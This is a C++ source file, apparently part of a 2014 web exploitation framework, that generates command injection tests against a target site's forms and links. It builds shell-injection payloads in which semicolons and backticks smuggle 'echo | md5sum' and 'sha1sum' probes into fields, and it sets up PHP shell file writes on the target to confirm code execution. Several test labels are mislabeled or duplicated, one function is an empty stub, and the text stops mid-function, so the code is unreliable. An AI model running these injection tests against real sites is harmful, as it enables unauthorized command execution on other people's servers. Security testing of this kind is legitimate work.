/*
 * BP-WebExploitationCommandExecution.cc
 *
 *  Created on: Sep 3, 2014
 *      Author: root
 */


#include "../../../../include/BP-Main.h"

/*
 * BP Command Injection Mechanisms:
 * =============================================
 * The way this works, is you provide the subsystem with a set of forms or anchors,
 * and they are run through a set of tests.  The tests perform a set of validations to
 * ensure that code execution occured.  The validations include:
 *
 * - Testing page output for reflection data.
 * - Testing file writes for file existence (such as writing to /var/www/)
 * - Optional command execution postback to an outside validation script, for out
 * - of bounds command execution.
 *
 */

// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%% Generate New Session Entry %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


// Generate default command injection tests
P_BP_WEB_COMMAND_INJECTION_TEST_SESSION BP_CommandInjectionGenerateNewCommandInjectionSession()
{

	// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
	// %%% Generate Initial Structure %%%%%%%%%%%%%%%%%%%%%%
	// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

	// create new command injection session structure
	P_BP_WEB_COMMAND_INJECTION_TEST_SESSION cmd_inj_session = (P_BP_WEB_COMMAND_INJECTION_TEST_SESSION) bpcalloc(sizeof(BP_WEB_COMMAND_INJECTION_TEST_SESSION), 1);
	if(!cmd_inj_session)
		return NULL;

	// create new linkl for managing memory
	cmd_inj_session->tq = BP_CreateLinkL("command injection test session", BP_FALSE);

	// initialize the local lock
	sem_init(&cmd_inj_session->lock, 0, 1);

	// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
	// %%% Add Gadget Libraries %%%%%%%%%%%%%%%%%%%%%%%%%%%%
	// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

	// add the php gadget library
	cmd_inj_session->php_gadget_library = BP_PHPOpenGadgetLibrary();


	// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
	// %%% Generate Injection Tests %%%%%%%%%%%%%%%%%%%%%%%%
	// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

	// Generate command injection tests
	BP_CommandInjectionGenerateDefaultTestElementsForSession
	(
			cmd_inj_session,
			DEFAULT_COMMAND_INJECTION_TEST_GENERATION_COUNT
	);


	// return a null pointer
	return cmd_inj_session;

}


// Generate a new command injection test session, complete with default values filled
// in, by providing a web assessment.
P_BP_WEB_COMMAND_INJECTION_TEST_SESSION BP_CommandInjectionGenerateNewSessionFromWebAssessmentAndHTMLExtraction
(
		P_BP_WEB_ASSESSMENT assessment,
		P_BP_HTML_FULL_EXTRACTION html_extraction

)
{

	// return null if we have no assessment
	if(!assessment)
		return NULL;
	if(!html_extraction)
		return NULL;

	// we must have some forms or anchors to parse to create the session
	if(!html_extraction->forms && !html_extraction->anchors)
		return NULL;


	// generate a new empty command injection session
	P_BP_WEB_COMMAND_INJECTION_TEST_SESSION session = BP_CommandInjectionGenerateNewCommandInjectionSession();

	// set the assessment reference
	session->assessment_reference = assessment;

	// set the html assessment reference
	session->html_extraction_reference = html_extraction;

	// set flag to stop execution after discovery (prevents overzealous testing)
	session->stop_cmd_injection_test_after_code_execution_discovered = BP_TRUE;

	// Parse the html for new targets
	BP_CommandInjectionParseHtmlExtractionForNewTargets
	(
			session,
			session->html_extraction_reference
	);


	// return NULL for failure
	return session;
}


// Destroy the commadn line injection session
BP_ERROR_T BP_CommandInjectionDestroySession(P_BP_WEB_COMMAND_INJECTION_TEST_SESSION cmd_injection_session)
{

	// ensure we have an injection session
	if(!cmd_injection_session)
		return ERR_FAILURE;


	// destroy the php gadget library
	if(cmd_injection_session->php_gadget_library)
		BP_PHPCloseDestroyGadgetLibrary(cmd_injection_session->php_gadget_library);

	// destroy the command injection session if set
	if(cmd_injection_session->tq)
		BP_DestroyLinkL(cmd_injection_session->tq, BP_TRUE);

	// destroy the semaphore
	sem_destroy(&cmd_injection_session->lock);

	// destroy the command injection session
	bpfree(cmd_injection_session);

	// return indicating success
	return ERR_SUCCESS;
}

// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%% Test Generation %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


// adds a command injection test to a provided session
BP_ERROR_T BP_CommandInjectionAddTestToSession
(
		P_BP_WEB_COMMAND_INJECTION_TEST_SESSION session,
		P_BP_WEB_COMMAND_INJECTION_ELEMENT         test
)
{

	// ensure we have a session
	if(!session)
		return ERR_FAILURE;

	// ensure we have a test
	if(!test)
		return ERR_FAILURE;




	// return indicating success
	return ERR_SUCCESS;

}


// Generates a stack of randomly generated test elements, and adds them
// to the provided session.
BP_ERROR_T BP_CommandInjectionGenerateDefaultTestElementsForSession
(
		P_BP_WEB_COMMAND_INJECTION_TEST_SESSION session,
		size_t                                  element_creation_n
)
{

	// ensure we have a session count
	if(!session)
		return ERR_FAILURE;

	// ensure we have an element creation count
	if(!element_creation_n)
		return ERR_FAILURE;

	// Create test elements
	session->test_elements = (P_BP_WEB_COMMAND_INJECTION_ELEMENT) tq_calloc
	(
			session->tq,
			sizeof(BP_WEB_COMMAND_INJECTION_ELEMENT) * element_creation_n,
			1,
			BPLN
	);



	// create index for test
	size_t file_verification_test_idx = 0;

	// create index for reflection tests
	size_t reflection_test_idx = 0;


	// When generating upload files, they are chosen at random.  This is the name of the file to gen.
	char *front_part_of_random_filename = NULL;

	// joiner for filename
	char *string_joiner[10];

	// when the joiner array is combined, this is created string
	char * joined_filename;

	// iterator index for creating individual tests
	size_t test_element_idx = 0;

	// string TO md5/sha1
	char * string_to_md5  = NULL;
	char * string_to_sha1 = NULL;

	// md5 string and sha1 strings
	char * md5  = NULL;
	char * sha1 = NULL;

	// create a number of individual elements
	for
	(
			test_element_idx = 0;
			test_element_idx < element_creation_n;
			test_element_idx++
	)
	{

		// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
		// %%% Reset Iterators on Loop %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
		// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

		// reset verification test iterator
		file_verification_test_idx = 0;


		// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
		// %%% Add Default File Verification Tests %%%%%%%%%%%%%%%%%%%
		// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

		// set this to whatever you want
		size_t default_file_verification_test_count = 10;

		// generate space for the file verification tests
		P_BP_WEB_COMMAND_INJECTION_FILE_VERIFICATION_TEST file_verification_tests = (P_BP_WEB_COMMAND_INJECTION_FILE_VERIFICATION_TEST) tq_calloc
		(
			session->tq,
			sizeof(BP_WEB_COMMAND_INJECTION_FILE_VERIFICATION_TEST) * default_file_verification_test_count,
			1,
			BPLN
		);


		// --- Add Individual Tests -------------------------

		// create reference for added readability
		P_BP_WEB_COMMAND_INJECTION_FILE_VERIFICATION_TEST file_test = NULL;

		// zero the filename joiner
		BP_ZERO_STACK(string_joiner);


		// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
		// %%% First Test: ADD PHP File %%%%%%%%%%%%%%%%%%%%%%%%%%%
		// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


		// --- Test One -- Simple Upload Test -----

		// move to test at index position
		file_test = &file_verification_tests[file_verification_test_idx];

		// set the verification path type
		file_test->verification_path_type = BP_WEB_COMMAND_INJECTION_FILE_CHECK_RELATIVE_PATH;

		// set the test language as php
		file_test->programming_language_for_file_upload = BP_WEB_COMMAND_INJECTION_FILE_PROGRAMMING_LANGUAGE_PHP;

		// set the cleanup indicator to destroy the shell after verification
		file_test->cleanup_indicator = BP_WEB_COMMAND_INJECTION_FILE_CLEANUP_DESTROY_SHELL;

		// generate front part
		front_part_of_random_filename = BP_GenRandomASCIICharString(BP_GenRandomUnsignedLong(4, 8), BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER, session->tq);

		// set the joined filename
		file_test->upload_file_name = front_part_of_random_filename;


		// generate random data for upload body
		file_test->upload_file_body = BP_GenRandomASCIICharString(BP_GenRandomUnsignedLong(4, 8), BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER, session->tq);

		// set the upload file path
		file_test->upload_file_path = tq_strdup(session->tq, "./", BPLN);

		// set the front and back parts
		file_test->front_part = NULL;
		file_test->back_part  = tq_strdup(session->tq, ";", BPLN);

		// increase index
		file_verification_test_idx++;

		// --- Test Two -- Double Semi Colons -----

		// move to test at index position
		file_test = &file_verification_tests[file_verification_test_idx];

		// set the verification path type
		file_test->verification_path_type = BP_WEB_COMMAND_INJECTION_FILE_CHECK_RELATIVE_PATH;

		// set the test language as php
		file_test->programming_language_for_file_upload = BP_WEB_COMMAND_INJECTION_FILE_PROGRAMMING_LANGUAGE_PHP;

		// set the cleanup indicator to destroy the shell after verification
		file_test->cleanup_indicator = BP_WEB_COMMAND_INJECTION_FILE_CLEANUP_DESTROY_SHELL;

		// generate front part
		front_part_of_random_filename = BP_GenRandomASCIICharString(BP_GenRandomUnsignedLong(4, 8), BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER, session->tq);

		// set the joined filename
		file_test->upload_file_name = front_part_of_random_filename;


		// generate random data for upload body
		file_test->upload_file_body = BP_GenRandomASCIICharString(BP_GenRandomUnsignedLong(4, 8), BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER, session->tq);

		// set the upload file path
		file_test->upload_file_path = tq_strdup(session->tq, "./", BPLN);

		// set the front and back parts
		file_test->front_part = tq_strdup(session->tq, ";", BPLN);
		file_test->back_part  = tq_strdup(session->tq, ";", BPLN);

		// increase index
		file_verification_test_idx++;

		// --- Test Two -- Double Semi Colons -----

		// move to test at index position
		file_test = &file_verification_tests[file_verification_test_idx];

		// set the verification path type
		file_test->verification_path_type = BP_WEB_COMMAND_INJECTION_FILE_CHECK_RELATIVE_PATH;

		// set the test language as php
		file_test->programming_language_for_file_upload = BP_WEB_COMMAND_INJECTION_FILE_PROGRAMMING_LANGUAGE_PHP;

		// set the cleanup indicator to destroy the shell after verification
		file_test->cleanup_indicator = BP_WEB_COMMAND_INJECTION_FILE_CLEANUP_DESTROY_SHELL;

		// generate front part
		front_part_of_random_filename = BP_GenRandomASCIICharString(BP_GenRandomUnsignedLong(4, 8), BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER, session->tq);

		// set the joined filename
		file_test->upload_file_name = front_part_of_random_filename;


		// generate random data for upload body
		file_test->upload_file_body = BP_GenRandomASCIICharString(BP_GenRandomUnsignedLong(4, 8), BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER, session->tq);

		// set the upload file path
		file_test->upload_file_path = tq_strdup(session->tq, "./", BPLN);

		// set the front and back parts
		file_test->front_part = tq_strdup(session->tq, "`", BPLN);
		file_test->back_part  = tq_strdup(session->tq, "`", BPLN);

		// increase index
		file_verification_test_idx++;


		// --- Test Two -- Double Semi Colons -----

		// move to test at index position
		file_test = &file_verification_tests[file_verification_test_idx];

		// set the verification path type
		file_test->verification_path_type = BP_WEB_COMMAND_INJECTION_FILE_CHECK_RELATIVE_PATH;

		// set the test language as php
		file_test->programming_language_for_file_upload = BP_WEB_COMMAND_INJECTION_FILE_PROGRAMMING_LANGUAGE_PHP;

		// set the cleanup indicator to destroy the shell after verification
		file_test->cleanup_indicator = BP_WEB_COMMAND_INJECTION_FILE_CLEANUP_DESTROY_SHELL;

		// generate front part
		front_part_of_random_filename = BP_GenRandomASCIICharString(BP_GenRandomUnsignedLong(4, 8), BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER, session->tq);

		// set the joined filename
		file_test->upload_file_name = front_part_of_random_filename;


		// generate random data for upload body
		file_test->upload_file_body = BP_GenRandomASCIICharString(BP_GenRandomUnsignedLong(4, 8), BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER, session->tq);

		// set the upload file path
		file_test->upload_file_path = tq_strdup(session->tq, "./", BPLN);

		// set the front and back parts
		file_test->front_part = tq_strdup(session->tq, ";", BPLN);
		file_test->back_part  = tq_strdup(session->tq, ";", BPLN);

		// increase index
		file_verification_test_idx++;

		// --- Test Two -- Double Semi Colons -----

		// move to test at index position
		file_test = &file_verification_tests[file_verification_test_idx];

		// set the verification path type
		file_test->verification_path_type = BP_WEB_COMMAND_INJECTION_FILE_CHECK_RELATIVE_PATH;

		// set the test language as php
		file_test->programming_language_for_file_upload = BP_WEB_COMMAND_INJECTION_FILE_PROGRAMMING_LANGUAGE_PHP;

		// set the cleanup indicator to destroy the shell after verification
		file_test->cleanup_indicator = BP_WEB_COMMAND_INJECTION_FILE_CLEANUP_DESTROY_SHELL;

		// generate front part
		front_part_of_random_filename = BP_GenRandomASCIICharString(BP_GenRandomUnsignedLong(4, 8), BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER, session->tq);

		// set the joined filename
		file_test->upload_file_name = front_part_of_random_filename;


		// generate random data for upload body
		file_test->upload_file_body = BP_GenRandomASCIICharString(BP_GenRandomUnsignedLong(4, 8), BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER, session->tq);

		// set the upload file path
		file_test->upload_file_path = tq_strdup(session->tq, "./", BPLN);

		// set the front and back parts
		file_test->front_part = tq_strdup(session->tq, ";", BPLN);
		file_test->back_part  = NULL;

		// increase index
		file_verification_test_idx++;



		// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
		// %%% Add Reflection Tests %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
		// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

		// set this to whatever you want
		size_t default_pattern_reflection_test_count = 30;

		// generate space for the file verification tests
		P_BP_WEB_COMMAND_INJECTION_PATTERN_REFLECTION_TEST pattern_reflection_tests = (P_BP_WEB_COMMAND_INJECTION_PATTERN_REFLECTION_TEST) tq_calloc
		(
			session->tq,
			sizeof(BP_WEB_COMMAND_INJECTION_PATTERN_REFLECTION_TEST) * default_pattern_reflection_test_count,
			1,
			BPLN
		);


		// --- Add Individual Tests -------------------------

		// create reference for added readability
		P_BP_WEB_COMMAND_INJECTION_PATTERN_REFLECTION_TEST pattern_reflection_test = NULL;

		// zero the filename joiner
		BP_ZERO_STACK(string_joiner);

		// for iterating added indexes
		reflection_test_idx = 0;


		// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
		// %%% Add Reflection Tests %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
		// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

		// --- Test 1: Sha1sum test --------------------------

		// set the pattern reflection test
		pattern_reflection_test = &pattern_reflection_tests[reflection_test_idx];

		// generate a random string to hash
		string_to_sha1 = BP_GenRandomASCIICharString
		(
				BP_GenRandomUnsignedLong(5,10),
				BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER
		);

		// generate a hash value to match
		sha1 = BP_GenSHA1(string_to_sha1, bpstrlen(string_to_sha1));

		// set the test
		string_joiner[0] = "echo -n ";
		string_joiner[1] = string_to_sha1;
		string_joiner[2] = " | sha1sum;";


		// add the execution test
		pattern_reflection_test->execution_test = BP_JoinStringArray((char **) &string_joiner, 3, session->tq);

		// store the precomputed result
		pattern_reflection_test->precomputed_test_result = tq_strdup(session->tq, sha1, BPLN);

		// set the back part (no front part for this test)
		pattern_reflection_test->back_part = tq_strdup(session->tq, ";", BPLN);

		// destroy the calculated sha1 string
		bpfree(sha1);
		bpfree(string_to_sha1);

		// increment the reflection test index
		reflection_test_idx++;

		// --- Test 2: md5 test --------------------------

		// set the pattern reflection test
		pattern_reflection_test = &pattern_reflection_tests[reflection_test_idx];

		// generate a random string to hash
		string_to_md5 = BP_GenRandomASCIICharString
		(
				BP_GenRandomUnsignedLong(5,10),
				BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER
		);

		// generate a hash value to match
		md5 = BP_GenMD5(string_to_md5, bpstrlen(string_to_md5));

		// set the test
		string_joiner[0] = "echo -n ";
		string_joiner[1] = string_to_md5;
		string_joiner[2] = " | md5sum;";

		// add the execution test
		pattern_reflection_test->execution_test = BP_JoinStringArray((char **) &string_joiner, 3, session->tq);

		// store the precomputed result
		pattern_reflection_test->precomputed_test_result = tq_strdup(session->tq, md5, BPLN);

		// set the back part (no front part for this test)
		pattern_reflection_test->back_part = tq_strdup(session->tq, ";", BPLN);

		// destroy the calculated sha1 string
		bpfree(md5);
		bpfree(string_to_md5);

		// increment the reflection test index
		reflection_test_idx++;

		// --- Test 3: md5 test with different semicolon placement --------------------------

		// set the pattern reflection test
		pattern_reflection_test = &pattern_reflection_tests[reflection_test_idx];

		// generate a random string to hash
		string_to_md5 = BP_GenRandomASCIICharString
		(
				BP_GenRandomUnsignedLong(5,10),
				BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER
		);

		// generate a hash value to match
		md5 = BP_GenMD5(string_to_md5, bpstrlen(string_to_md5));

		// set the test
		string_joiner[0] = ";echo -n ";
		string_joiner[1] = string_to_md5;
		string_joiner[2] = " | md5sum";

		// add the execution test
		pattern_reflection_test->execution_test = BP_JoinStringArray((char **) &string_joiner, 3, session->tq);

		// store the precomputed result
		pattern_reflection_test->precomputed_test_result = tq_strdup(session->tq, md5, BPLN);

		// set the front part (no back part for this test)
		pattern_reflection_test->front_part = tq_strdup(session->tq, ";", BPLN);

		// destroy the calculated sha1 string
		bpfree(md5);
		bpfree(string_to_md5);

		// increment the reflection test index
		reflection_test_idx++;

		// --- Test 4: Sha1sum test with different semicolon --------------------------

		// set the pattern reflection test
		pattern_reflection_test = &pattern_reflection_tests[reflection_test_idx];

		// generate a random string to hash
		string_to_sha1 = BP_GenRandomASCIICharString
		(
				BP_GenRandomUnsignedLong(5,10),
				BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER
		);

		// generate a hash value to match
		sha1 = BP_GenSHA1(string_to_sha1, bpstrlen(string_to_sha1));

		// set the test
		string_joiner[0] = ";echo -n ";
		string_joiner[1] = string_to_sha1;
		string_joiner[2] = " | sha1sum";

		// add the execution test
		pattern_reflection_test->execution_test = BP_JoinStringArray((char **) &string_joiner, 3, session->tq);

		// store the precomputed result
		pattern_reflection_test->precomputed_test_result = tq_strdup(session->tq, sha1, BPLN);

		// set the front part (no back part for this test)
		pattern_reflection_test->front_part = tq_strdup(session->tq, ";", BPLN);

		// destroy the calculated sha1 string
		bpfree(sha1);
		bpfree(string_to_sha1);

		// increment the reflection test index
		reflection_test_idx++;


		// --- Test 5: md5 test with different inline ticks --------------------------

		// set the pattern reflection test
		pattern_reflection_test = &pattern_reflection_tests[reflection_test_idx];

		// generate a random string to hash
		string_to_md5 = BP_GenRandomASCIICharString
		(
				BP_GenRandomUnsignedLong(5,10),
				BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER
		);

		// generate a hash value to match
		md5 = BP_GenMD5(string_to_md5, bpstrlen(string_to_md5));

		// set the test
		string_joiner[0] = "`echo -n ";
		string_joiner[1] = string_to_md5;
		string_joiner[2] = " | md5sum`;";

		// add the execution test
		pattern_reflection_test->execution_test = BP_JoinStringArray((char **) &string_joiner, 3, session->tq);

		// store the precomputed result
		pattern_reflection_test->precomputed_test_result = tq_strdup(session->tq, md5, BPLN);

		// set the front part
		pattern_reflection_test->front_part = tq_strdup(session->tq, "`", BPLN);

		// set the back part
		pattern_reflection_test->back_part = tq_strdup(session->tq, "`;", BPLN);

		// destroy the calculated sha1 string
		bpfree(md5);
		bpfree(string_to_md5);

		// increment the reflection test index
		reflection_test_idx++;

		// --- Test 6: Sha1sum test with different semicolon --------------------------

		// set the pattern reflection test
		pattern_reflection_test = &pattern_reflection_tests[reflection_test_idx];

		// generate a random string to hash
		string_to_sha1 = BP_GenRandomASCIICharString
		(
				BP_GenRandomUnsignedLong(5,10),
				BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER
		);

		// generate a hash value to match
		sha1 = BP_GenSHA1(string_to_sha1, bpstrlen(string_to_sha1));

		// set the test
		string_joiner[0] = ";`echo -n ";
		string_joiner[1] = string_to_sha1;
		string_joiner[2] = " | sha1sum`;";

		// add the execution test
		pattern_reflection_test->execution_test = BP_JoinStringArray((char **) &string_joiner, 3, session->tq);

		// store the precomputed result
		pattern_reflection_test->precomputed_test_result = tq_strdup(session->tq, sha1, BPLN);

		// set the front part
		pattern_reflection_test->front_part = tq_strdup(session->tq, ";`", BPLN);

		// set the back part
		pattern_reflection_test->back_part = tq_strdup(session->tq, "`;", BPLN);


		// destroy the calculated sha1 string
		bpfree(sha1);
		bpfree(string_to_sha1);

		// increment the reflection test index
		reflection_test_idx++;


		// --- Test 7: md5 test with different inline ticks and different semicolon --------------------------

		// set the pattern reflection test
		pattern_reflection_test = &pattern_reflection_tests[reflection_test_idx];

		// generate a random string to hash
		string_to_md5 = BP_GenRandomASCIICharString
		(
				BP_GenRandomUnsignedLong(5,10),
				BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER
		);

		// generate a hash value to match
		md5 = BP_GenMD5(string_to_md5, bpstrlen(string_to_md5));

		// set the test
		string_joiner[0] = ";`echo -n ";
		string_joiner[1] = string_to_md5;
		string_joiner[2] = " | md5sum`";

		// add the execution test
		pattern_reflection_test->execution_test = BP_JoinStringArray((char **) &string_joiner, 3, session->tq);

		// store the precomputed result
		pattern_reflection_test->precomputed_test_result = tq_strdup(session->tq, md5, BPLN);

		// set the front part
		pattern_reflection_test->front_part = tq_strdup(session->tq, ";`", BPLN);

		// set the back part
		pattern_reflection_test->back_part = tq_strdup(session->tq, "`", BPLN);


		// destroy the calculated sha1 string
		bpfree(md5);
		bpfree(string_to_md5);

		// increment the reflection test index
		reflection_test_idx++;

		// --- Test 8: Sha1sum test with different semicolon and inline ticks --------------------------

		// set the pattern reflection test
		pattern_reflection_test = &pattern_reflection_tests[reflection_test_idx];

		// generate a random string to hash
		string_to_sha1 = BP_GenRandomASCIICharString
		(
				BP_GenRandomUnsignedLong(5,10),
				BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER
		);

		// generate a hash value to match
		sha1 = BP_GenSHA1(string_to_sha1, bpstrlen(string_to_sha1));

		// set the test
		string_joiner[0] = ";`echo -n ";
		string_joiner[1] = string_to_sha1;
		string_joiner[2] = " | sha1sum`";

		// add the execution test
		pattern_reflection_test->execution_test = BP_JoinStringArray((char **) &string_joiner, 3, session->tq);

		// store the precomputed result
		pattern_reflection_test->precomputed_test_result = tq_strdup(session->tq, sha1, BPLN);

		// set the front part
		pattern_reflection_test->front_part = tq_strdup(session->tq, ";`", BPLN);

		// set the back part
		pattern_reflection_test->back_part = tq_strdup(session->tq, "`", BPLN);



		// destroy the calculated sha1 string
		bpfree(sha1);
		bpfree(string_to_sha1);

		// increment the reflection test index
		reflection_test_idx++;

		// --- Test 8: md5 test with different inline ticks and NO semicolon --------------------------

		// set the pattern reflection test
		pattern_reflection_test = &pattern_reflection_tests[reflection_test_idx];

		// generate a random string to hash
		string_to_md5 = BP_GenRandomASCIICharString
		(
				BP_GenRandomUnsignedLong(5,10),
				BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER
		);

		// generate a hash value to match
		md5 = BP_GenMD5(string_to_md5, bpstrlen(string_to_md5));

		// set the test
		string_joiner[0] = "`echo -n ";
		string_joiner[1] = string_to_md5;
		string_joiner[2] = " | md5sum`";

		// add the execution test
		pattern_reflection_test->execution_test = BP_JoinStringArray((char **) &string_joiner, 3, session->tq);

		// store the precomputed result
		pattern_reflection_test->precomputed_test_result = tq_strdup(session->tq, md5, BPLN);

		// set the front part
		pattern_reflection_test->front_part = tq_strdup(session->tq, "`", BPLN);

		// set the back part
		pattern_reflection_test->back_part = tq_strdup(session->tq, "`", BPLN);


		// destroy the calculated sha1 string
		bpfree(md5);
		bpfree(string_to_md5);

		// increment the reflection test index
		reflection_test_idx++;

		// --- Test 9: Sha1sum test with NO semicolon and inline ticks --------------------------

		// set the pattern reflection test
		pattern_reflection_test = &pattern_reflection_tests[reflection_test_idx];

		// generate a random string to hash
		string_to_sha1 = BP_GenRandomASCIICharString
		(
				BP_GenRandomUnsignedLong(5,10),
				BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER
		);

		// generate a hash value to match
		sha1 = BP_GenSHA1(string_to_sha1, bpstrlen(string_to_sha1));

		// set the test
		string_joiner[0] = "`echo -n ";
		string_joiner[1] = string_to_sha1;
		string_joiner[2] = " | sha1sum`";

		// add the execution test
		pattern_reflection_test->execution_test = BP_JoinStringArray((char **) &string_joiner, 3, session->tq);

		// store the precomputed result
		pattern_reflection_test->precomputed_test_result = tq_strdup(session->tq, sha1, BPLN);

		// set the front part
		pattern_reflection_test->front_part = tq_strdup(session->tq, "`", BPLN);

		// set the back part
		pattern_reflection_test->back_part = tq_strdup(session->tq, "`", BPLN);


		// destroy the calculated sha1 string
		bpfree(sha1);
		bpfree(string_to_sha1);

		// increment the reflection test index
		reflection_test_idx++;


		// --- Test 10: md5 test with different inline ticks and double semicolon --------------------------

		// set the pattern reflection test
		pattern_reflection_test = &pattern_reflection_tests[reflection_test_idx];

		// generate a random string to hash
		string_to_md5 = BP_GenRandomASCIICharString
		(
				BP_GenRandomUnsignedLong(5,10),
				BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER
		);

		// generate a hash value to match
		md5 = BP_GenMD5(string_to_md5, bpstrlen(string_to_md5));

		// set the test
		string_joiner[0] = ";`echo -n ";
		string_joiner[1] = string_to_md5;
		string_joiner[2] = " | md5sum`;";

		// add the execution test
		pattern_reflection_test->execution_test = BP_JoinStringArray((char **) &string_joiner, 3, session->tq);

		// store the precomputed result
		pattern_reflection_test->precomputed_test_result = tq_strdup(session->tq, md5, BPLN);

		// set the front part
		pattern_reflection_test->front_part = tq_strdup(session->tq, ";`", BPLN);

		// set the back part
		pattern_reflection_test->back_part = tq_strdup(session->tq, "`;", BPLN);


		// destroy the calculated sha1 string
		bpfree(md5);
		bpfree(string_to_md5);

		// increment the reflection test index
		reflection_test_idx++;

		// --- Test 11: Sha1sum test with DOUBLE semicolon and inline ticks --------------------------

		// set the pattern reflection test
		pattern_reflection_test = &pattern_reflection_tests[reflection_test_idx];

		// generate a random string to hash
		string_to_sha1 = BP_GenRandomASCIICharString
		(
				BP_GenRandomUnsignedLong(5,10),
				BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER
		);

		// generate a hash value to match
		sha1 = BP_GenSHA1(string_to_sha1, bpstrlen(string_to_sha1));

		// set the test
		string_joiner[0] = ";`echo -n ";
		string_joiner[1] = string_to_sha1;
		string_joiner[2] = " | sha1sum`;";

		// add the execution test
		pattern_reflection_test->execution_test = BP_JoinStringArray((char **) &string_joiner, 3, session->tq);

		// store the precomputed result
		pattern_reflection_test->precomputed_test_result = tq_strdup(session->tq, sha1, BPLN);

		// set the front part
		pattern_reflection_test->front_part = tq_strdup(session->tq, ";`", BPLN);

		// set the back part
		pattern_reflection_test->back_part = tq_strdup(session->tq, "`;", BPLN);


		// destroy the calculated sha1 string
		bpfree(sha1);
		bpfree(string_to_sha1);

		// increment the reflection test index
		reflection_test_idx++;


		// --- Test12: md5 test with double semicolon --------------------------

		// set the pattern reflection test
		pattern_reflection_test = &pattern_reflection_tests[reflection_test_idx];

		// generate a random string to hash
		string_to_md5 = BP_GenRandomASCIICharString
		(
				BP_GenRandomUnsignedLong(5,10),
				BP_GEN_RANDOM_ASCII_STRING_TYPE_ALPHA_CAPS_OR_LOWER
		);

		// generate a hash value to match
		md5 = BP_GenMD5(string_to_md5, bpstrlen(string_to_md5));

		// set the test
		string_joiner[0] = "; echo -n ";
		string_joiner[1] = string_to_md5;
		string_joiner[2] = " | md5sum ;";

		// add the execution test
		pattern_reflection_test->execution_test = BP_JoinStringArray((char **) &string_joiner, 3, session->tq);

		// store the precomputed result
		pattern_reflection_test->precomputed_test_result = tq_strdup(session->tq, md5, BPLN);

		// set the front part
		pattern_reflection_test->front_part = tq_strdup(session->tq, ";", BPLN);

		// set the back part
		pattern_reflection_test->back_part = tq_strdup(session->tq, ";", BPLN);


		// destroy the calculated sha1 string
